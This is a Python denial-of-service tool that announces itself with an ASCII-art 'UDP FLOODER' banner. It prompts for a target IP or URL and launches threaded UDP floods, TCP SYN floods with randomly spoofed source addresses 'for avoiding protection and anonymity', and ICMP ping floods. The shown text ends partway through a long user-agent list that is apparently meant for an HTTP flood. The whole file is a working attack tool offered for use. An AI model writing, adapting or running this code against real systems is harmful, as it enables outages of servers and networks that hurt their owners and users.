import threading #imports module "threading" used for multitaskinng
import random #imports module "random" used for outputting random numbers, strings in an array etc. used in this script for creating random IP addresses for the "scapy" import 
from scapy.all import * #imports all functions from "scapy" module - used for crafting/spoofing packets. we use this to send packets using the TCP and UDP protocol
import ping3 # imports module "ping3" - used for the ICMP method (layer 3) which sends a bunch of pings really fast to overload a server/router
import requests



# ASCII art ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
print(""" 
  _    _  _____   _____         ______  _       ____    ____   _____   ______  _____  
 | |  | ||  __ \ |  __ \       |  ____|| |     / __ \  / __ \ |  __ \ |  ____||  __ \ 
 | |  | || |  | || |__) |      | |__   | |    | |  | || |  | || |  | || |__   | |__) |
 | |  | || |  | ||  ___/       |  __|  | |    | |  | || |  | || |  | ||  __|  |  _  / 
 | |__| || |__| || |           | |     | |____| |__| || |__| || |__| || |____ | | \ \ 
  \____/ |_____/ |_|           |_|     |______|\____/  \____/ |_____/ |______||_|  \_/
                                                                                       
""")

print("""
                                        *@@&*(%@#@#.    &%    .%%,@*            .@#%(***./%*&*                                                                   
                                    (&/. #@&@@@&/.      .&/      .(&#            .@%(%,*/,% *@(                                                                   
                                #%#.                   ,@#**,,,/&#             #&,((/,/*/#*#/                                                                   
                            ,#(((.#*                     %&,/,..*@,           .#@ /(,/(#//(%&*                                                                   
                                */                      ,@,,.    (%         .#&(.%/(/(,,#/(##                                                                    
                                                        (@@@@@@@@@&.     ,%&#(,##,(%&/,* ,@(                                                                     
                                                        #%./,   ,,@/./&@% .#*#(..%..##%,.&(                                                                      
                                                        /@,((,   ,./&,(* ,%(#/  ,, .( ,/%@*                                                                       
                                                    ,(&@/,(*.    .,&(/#&/,#*,/#*.(/.,%&*                                                                         
                                                .(&%#, #**/.     ,.#&/.*%(//#/*((*#@#,                                                                           
                                                ,&%%* **,&**/       .##(%/#((%((%&&/.                                                                              
                                            *&&,  ,@&*.%*,(.      .#(,%%@@@%*                                                                                    
                                            ,%%. .#&#(&(.## ,.     ,,&/..                                                                                          
                                        *&(.,/%/ /#,(,,@,,,   .*,%%                                                                                             
                                        /@(./#%,,# ,/.#&%@,*,.   /@.                                                                                             
                                        ,@&((/#(/#.*(,(#. #&,**, /@,                                                                                              
                                    .  #@(,,##,/*@**&@(/(#@@&%%%@%((*,.....                                                                                      
                                %&,,%@&@@@@&#(#(((*,,...       . ...,,,...,*(%@@@@%%@(,/@*                                                                      
                                /&#/#&&@%%&&&&%%##(/,.  ,*. .,,**//////(((#%&&@&&#/#&#/%@.                                                                      
                                        #@, ./%**((#*,#@@%(#(/#%((/(&@#,,.                                                                                        
                                        *&%#(*/,*(. /(.,&&@(, .  .%&#%(                                                                                           
                                        /@/(#(%(/ */*(/(#..*#&&@@(,*&(                                                                                           
                                        &&..(###@/,##*(.  ,/. ,( .*%%&@#..                                                                                      
                                            /&, ,#/@. (%(/&*  .*.  .#...#%#&&@@(                                                                                   
                                            .#&*  #(#%((*,,#...,(,../%//%/,&  .%&*                                                                                
                                                /&%, *(*/%*  .//. ./%(/(/.&  ,((((%&,                                                                              
                                                *#&(*(/  #%#/*#%(*(%#(  /(*/(..#.&(                                                                             
                                                    ,&@@@(**(. *@%#/  #(,(* ,((*&*&/                                                                            
                                                    ,%//,, *&&@@#/#*%@@&, (@%##. */&/                                                                           
                                                    ,%/.   ,%(.**(@&#**(,%/(/ ,*.(./%,                                                                          
                                                    ,%#,   ,%(  ./%#&@#./%.,*,(, .#(&*                                                                          
                                                    ,%#,   .%/   ,###,#&,/(*(. #*(*,%*                                                                          
                                                    ,%#,   .%(    (##.,&%#/ ,#(# .%&#.                                                                          
                                                    ,%(,   .#/    /%#.*&#&(/(* #,*#&/                                                                           
                                                    *#(,   .(*    /%(/@(%* (#,(, ,&/                                                                            
                                                    *#(,   .(*    /%@&%/(../,.(*%&,                                                                             
                                                    *#(.   .(,    *%&(//%/#/ *(@(                                                                               
                                                    *%#,   .(*    *%@%## .#/#&(                                                                                 
                                                    *##.   .(*    *%&%&,/(#&*                                                                                   
                                                    .(@&/    .(/    *%&&*(@(.                                                                                     
                                               .#@%#@&,    .#/    ,%@&/.                                                                                        
                                            .#@#/%,/&%,    .#/    ,%#.                                                                                          
                                          ,%&/#%#*#%@&,    .#/    .##.                                                                                          
                                            %&*(*/*,#%&&%/    .#/     (#.                                                                                          
                                       /@,/&/%/*@.#@@%(    .(*    .(#.                                                                                          
                                     .%# #/##(*(@(. /#(     /,    ,%#.                                                                                          
                                      #%(@####%@/    /#/     ,.    .&%. *%&&&&&&%(,                                                                              
                                    ,&/#(%(#(&,     /%/            (&@&##(((/(//%/&%,                                                                           
                                    *%*&(%((%*      (#/          .(&%#(((@%@&%%%@###&/                                                                          
                                    *%/&%/&%%.      /%,       .#@%%((%&#%&,      *@%#&,                                                                         
                                    .%/*@&/(@(      ,%/.  ,#@&%/#*#(/&@,         (@%#&,                                                                         
""")



print(""" _______   __      __         ______   __        ________  ______  ________
/       \ /  \    /  |       /      \ /  |      /        |/      |/        |
$$$$$$$  |$$  \  /$$/       /$$$$$$  |$$ |      $$$$$$$$/ $$$$$$/ $$$$$$$$/
$$ |__$$ | $$  \/$$/        $$ |__$$ |$$ |      $$ |__      $$ |  $$ |__
$$    $$<   $$  $$/         $$    $$ |$$ |      $$    |     $$ |  $$    |
$$$$$$$  |   $$$$/          $$$$$$$$ |$$ |      $$$$$/      $$ |  $$$$$/
$$ |__$$ |    $$ |          $$ |  $$ |$$ |_____ $$ |       _$$ |_ $$ |_____
$$    $$/     $$ |          $$ |  $$ |$$       |$$ |      / $$   |$$       |
$$$$$$$/      $$/           $$/   $$/ $$$$$$$$/ $$/       $$$$$$/ $$$$$$$$/
""")

#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# asks for method to DDoS 

method = int(input("""What method?
1. UDP 
2. TCP
3. ICMP (Layer 3)
4. HTTPS (Layer 7):\n"""))

#--------------------------------------------------------

#variables for the target ip address, sets port to default 80, packet size to 200, asks how many threads to use (concurrent tasks), asks how many requests to send in total per thread. 
if method == 4:
    targ = str(input("What is the URL? "))
else:
    targ = str(input("What is the IP? "))

Port = 80
x = int(input("How many requests to send? "))
packet_size = 200
threads = int(input("How many threads? "))


# if i wanna input my own packet size, must be atleast 28 for the TCP header, or 40 for UDP header
if packet_size < 28:
    raise ValueError("Packet size must be at least 28 bytes (20 for IP header + 8 for TCP header).")

# creates random IP address for scapy import to spoof the packet
def randomIP():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

#sets done to False so we can use a while loop
done = False



#UDP METHOD ---------------------------------------------------------------------------------------------------------

def udp_method(): # creates function "udp_method"

    global done # globalises "done" variable - lets us use it in this function

    c = 0 # sets "c" to 0 so we can count how many packets have been sent (per thread)

    payload_size = packet_size - 20 - 8  # Adjust for the IP header (20 bytes) and UDP header (8 bytes)
    payload = "A" * payload_size  # Create the payload - "A" = 1 byte

    while not done: #while done = False, do this:

        for _ in range(x): #loops through the code below for the amount of requests specified from "x" imput above

            if done: #when done is made True (after all requests sent), then stop the loop
                break
                
            ip = IP(src=randomIP(), dst=targ) #crafts where the packet is going and where its coming from - we use a random IP address generator from above for avoiding protection and anonymity
            udp = UDP(dport=Port)  # variable for the port (dport = destination port)
            raw = Raw(load=payload) #sets the payload for the script to send e.g. 1000 bytes per request
            pkt = ip / udp / raw # puts all the above together to craft the whole packet

            send(pkt, verbose=False) # sends the packet to the target, while not outputing anything, we create our own output below

            c += 1 # updates the count for the print below
            print("Sent ! Packet number: ", c, "UDP method") # creates an output telling us that we sent our packet, and how many we have sent (per thread)

        done = True # sets variable "done" to true so we can break out of the loop 

#Finish udp method --------------------------------------------------------------------------------------------------



#TCP METHOD ---------------------------------------------------------------------------------------------------------

def tcp_method():

    global done # globalises "done" variable - lets us use it in this function

    c = 0 # sets "c" to 0 so we can count how many packets have been sent (per thread)

    payload_size = packet_size - 20 - 20  # Adjust for the IP header (20 bytes) and TCP header (20 bytes)
    payload = "A" * payload_size  # Create the payload

    while not done: #while done = False, do this:

        for _ in range(x): #loops through the code below for the amount of requests specified from "x" imput above

            if done: #when done is made True (after all requests sent), then stop the loop
                break
                
            ip = IP(src=randomIP(), dst=targ) # crafts where the packet is going and where its coming from - we use a random IP address generator from above for avoiding protection and anonymity
            tcp = TCP(sport=RandShort(), dport=Port, flags="S") # variable for the port ("dport"" = destination port, "sport" = source port) flags "S" specifies that we are sending SYN packets (syn flood)
            raw = Raw(load=payload) # sets the payload for the script to send e.g. 1000 bytes per request
            pkt = ip / tcp / raw # puts all the above together to craft the whole packet

                
            send(pkt, verbose=False) # sends the packet to the target, while not outputing anything, we create our own output below

            c += 1 # updates the count for the print below
            print("Sent ! Packet number: ", c, "TCP method") # creates an output telling us that we sent our packet, and how many we have sent (per thread)

        done = True # sets variable "done" to true so we can break out of the loop 

#Finish TCP Method --------------------------------------------------------------------------------------------------



#ICMP METHOD --------------------------------------------------------------------------------------------------------

def icmp_method():

    global done # globalises "done" variable - lets us use it in this function

    for _ in range(x): #loops through the code below for the amount of requests specified from "x" imput above

        if done: #when done is made True (after all requests sent), then stop the loop
            break

        ping3.verbose_ping(targ , size=B , timeout=wait, ttl=250) #sends ICMP ping to the target IP address (targ), with the specified byte size (B), sends a new packet every x seconds (timeout=wait), ttl stands for ->
        # "Time to Live" - basically gives the packet a higher chance to reach the target (higher = more chance to reach targ)


    done = True # sets variable "done" to true so we can break out of the loop 

#Finish ICMP Method -------------------------------------------------------------------------------------------------




#THREADING !!!!!!!!!!! 

if method == 1: # if method == 1 aka UDP:

    for _ in range(threads): # Start x amount of threads

        t = threading.Thread(target=udp_method, daemon=True) #sets the thread target to the function "udp_method", daemon means we can exit the thread before its finished its done

        t.start() # starts the thread and function
        

if method == 2: # if method == 2 aka TCP:

    for _ in range(threads): # Start x amount of threads

        t = threading.Thread(target=tcp_method, daemon=True) #sets the thread target to the function "tcp_method", daemon means we can exit the thread before its finished its done

        t.start() # starts the thread and function


if method == 3: # if method == 3 aka ICMP:

    wait = float(input("how long should we wait for a response for?")) #asks how long to wait for a response from the target
    B = int(input("Size of packet? 1-65500")) # asks for size of ICMP packet we want to send

    for _ in range(threads): # Start x amount of threads

        t = threading.Thread(target=icmp_method, daemon=True) #sets the thread target to the function "icmp_method", daemon means we can exit the thread before its finished its done

        t.start() # starts the thread and function




user_agent_list = [
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Flare_Y3 Build/O11019)",
    "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T355Y Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; LM-Q630 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Le2 x527) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 YaBrowser/19.3.5.299.00 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; KFMUWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; wbx 1.0.0; Zoom 3.6.0; Microsoft Outlook 15.0.5215; ms-office; MSOffice 15)",
    "Mozilla/5.0 (Linux; U; Android 10; tr-tr; Redmi 8A Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.13.2-gn",
    "Mozilla/5.0 (Linux; Android 10; SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 OPR/70.0.3728.95",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; PSPTD21NA Build/O11019)",
    "Mozilla/5.0 (Linux; Android 9; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/46.01.4.5140",
    "Mozilla/5.0 (Linux; Android 11; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; InfoPath.3; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Microsoft Outlook 15.0.5233; Microsoft Outlook 15.0.5233; ms-office; MSOffice 15)",
    "Dalvik/2.1.0 (Linux; U; Android 9; JAT-LX3 Build/HONORJAT-LX3)",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/55.0.2883.79 Mobile/17E262 Safari/602.1",
    "Mozilla/5.0 (Linux; Android 9; SM-J701M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; JMM-L22 Build/HUAWEIJMM-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51",
    "Mozilla/5.0 (Linux; Android 9; SM-A207F Build/PPR1.180610.011; Cake) AppleWebKit/537.36 (KHTML, like Gecko) Version/6.0.21 Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; ASUS_Z01RD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Nokia 1 Plus Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 11; Infinix PR652B Build/RP1A.201005.001)",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 11; SM-F916U Build/RP1A.200720.012)",
    "Mozilla/5.0 (Linux; Android 10; CPH1819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; KB2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; arm_64; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 YaApp_Android/10.92 YaSearchBrowser/10.92 BroPP/1.0 SA/1 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; ELS-NX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; XT1710-02) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SCV43) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36",
    "Spotify%20Quick%20Like/1 CFNetwork/1220.1 Darwin/20.3.0",
    "Mozilla/5.0 (Linux; Android 9; SM-J730FM Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36 YaApp_Android/10.70 YaSearchBrowser/10.70",
    "Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/15.7.2.5",
    "Mozilla/5.0 (Linux; Android 10; GM1925) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 10; TECNO KE5 Build/QP1A.190711.020)",
    "Mozilla/5.0 (Linux; Android 11; A9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Safari/537.36 Edg/77.01.2.5140",
    "Dalvik/2.1.0 (Linux; U; Android 10; motorola one vision Build/QSAS30.62-24-15)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Waterfox/78.14.0",
    "Mozilla/5.0 (Linux; Android 10; CPH2091) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH1859) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile DuckDuckGo/5 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-N950U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Avast/91.0.10294.107",
    "Mozilla/5.0 (Linux; Android 9; VOG-L29 Build/HUAWEIVOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.64 HuaweiBrowser/10.0.1.332 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; LM-Q730 Build/QKQ1.200216.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; 5003D_EEA Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_1 like Mac OS X) AppleWebKit/607.3.9 (KHTML, like Gecko) Mobile/16H22 Perfect365/8.66.3",
    "Mozilla/5.0 (Linux; Android 10; SM-A207F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91",
    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; GA-TAB7V3G Build/KOT49H)",
    "Mozilla/5.0 (Linux; U; Android 6.0; PGN522 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36 OPR/50.0.2254.149182",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 NetHelper70",
    "Mozilla/5.0 (Linux; Android 4.4.4; SM-G530H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 PTST/201202.231242",
    "Dalvik/2.1.0 (Linux; U; Android 6.0; Blade X9 Build/MRA58K)",
    "Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/269.0.0.39.116;FBBV/220131619;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5.1;FBSS/2;FBCR/;FBID/phone;FBLC/en_VN;FBOP/0]",
    "Mozilla/5.0 (Linux; Android 9; A95X F3 Air Build/A95X_F3_AIR_M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G930A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 7.1.2; BLADE A6 MAX Build/N2G47H)",
    "Mozilla/5.0 (Linux; Android 11; SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; POT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.03.4.4958",
    "Mozilla/5.0 (Linux; Android 12; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 5.1; Amazing_X3s Build/LMY47D)",
    "Mozilla/5.0 (Linux; Android 10; LM-V405) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36",
    "MAC%20Vendors%20Pro/5.12.88 CFNetwork/1206 Darwin/20.1.0",
    "Mozilla/5.0 (Linux; Android 11; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A415F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; moto e5 play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 ACHEETAHI/2100501044",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4343.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:71.0 ) Gecko/20100101 Firefox/71.0 anonymized by Abelssoft 503749933",
    "Mozilla/5.0 (Linux; Android 10; SM-G965N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/2.1 Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; INE-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; LM-Q730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/46.01.4.5140",
    "Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; Venus E3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; TA-1032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4172.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36,gzip(gfe),gzip(gfe)",
    "Mozilla/5.0 (Linux; arm; Android 6.0; 5010D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 YaBrowser/20.4.2.101.00 SA/1 TA/5.1 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; POCOPHONE F1 Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91",
    "Mozilla/5.0 (Linux; Android 7.0; ASUS_Z017DC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 5.1; A59/F1s Build/LMY47I)",
    "Dalvik/2.1.0 (Linux; U; Android 6.0; LG-H630 Build/MRA58K)",
    "Mozilla/5.0 (Linux; Android 7.0; PMT3708_3G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.60 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-J810F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.116 Mobile Safari/537.36 Viber/13.1.0.4",
    "Mozilla/5.0 (Windows NT 6.0; rv:15.0) Gecko/20211102 Firefox/15.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.67",
    "Mozilla/5.0 (Linux; Android 7.0; ELUGA A4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 10; motorola one Build/QPKS30.54-22-15)",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; G7060 Build/O11019)",
    "Mozilla/5.0 (Linux; Android 10; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.12(0x17000c2f) NetType/4G Language/zh_CN wechatdevtools",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SP-5250 Build/O11019)",
    "Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 9; moto e(6) plus Build/PTBS29.401-36-4)",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi S2 MIUI/V10.2.1.0.OEFESVF)",
    "Mozilla/5.0 (Linux; Android 10; M2006C3LI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android Android 6.0; M9 Build/MRA58K)",
    "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J500H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; rk3326_mid Build/OPM8.181105.002)",
    "Mozilla/5.0 (Linux; arm_64; Android 10; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 YaBrowser/20.4.2.101.00 SA/1 Mobile Safari/537.36",
